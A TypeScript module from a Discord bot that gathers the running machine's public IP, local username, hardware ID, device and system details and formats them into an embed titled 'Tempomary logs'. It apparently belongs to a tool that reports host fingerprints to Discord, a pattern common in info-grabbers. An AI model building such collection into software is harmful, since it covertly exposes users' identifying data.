import { EmbedBuilder, Client } from 'discord.js'
import { getRandomColor } from '@/bot/functions/colors'
import { getFormattedTime } from '@/bot/functions/date'
import { getSystemInfo } from '@/bot/functions/check_system'
import { getLocalUsername } from '@/bot/functions/check_user'
import { getPublicIP } from '@/bot/functions/ip'
import { getDeviceType } from '@/bot/functions/device'
import { getHWID } from '@/bot/functions/hwid'

export const createEmbed = async (client: Client): Promise<EmbedBuilder> => {
  const publicIp = await getPublicIP()
  const localUser = getLocalUsername()
  const hwid = await getHWID()
  const time = getFormattedTime()
  const device = getDeviceType()
  const system = getSystemInfo()

  const embed = new EmbedBuilder()
    .setTitle('Tempomary logs')
    .addFields(
      { name: '⏰ Date', value: time, inline: true },
      { name: '💻 Device', value: device, inline: true },
      { name: '⚙️ System', value: system, inline: true },
      { name: '🌐 IPv4', value: publicIp, inline: true },
      { name: '👤 User', value: localUser, inline: true },
      { name: '🆔 HWID', value: hwid, inline: true }
    )
    .setThumbnail(client.user?.displayAvatarURL() || '')
    .setColor(getRandomColor())

  return embed
}
